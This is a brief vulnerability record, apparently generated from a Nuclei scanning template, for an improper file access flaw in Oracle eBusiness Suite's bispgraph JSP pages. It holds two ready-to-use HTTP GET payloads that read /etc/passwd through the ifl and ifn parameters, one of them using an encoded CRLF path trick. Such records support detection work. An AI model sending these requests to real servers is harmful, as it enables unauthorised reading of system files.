# Vulnerability: Oracle eBusiness Suite - Improper File Access
**Classification:** ORACLE
**Source:** Nuclei Template (`oracle-ebs-bispgraph-file-access.yaml`)

## Description
Oracle eBusiness Suite is susceptible to improper file access vulnerabilities via bispgrapgh. Be aware this product is no longer supported with patches or security fixes.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/
GET {{BaseURL}}/OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd
```

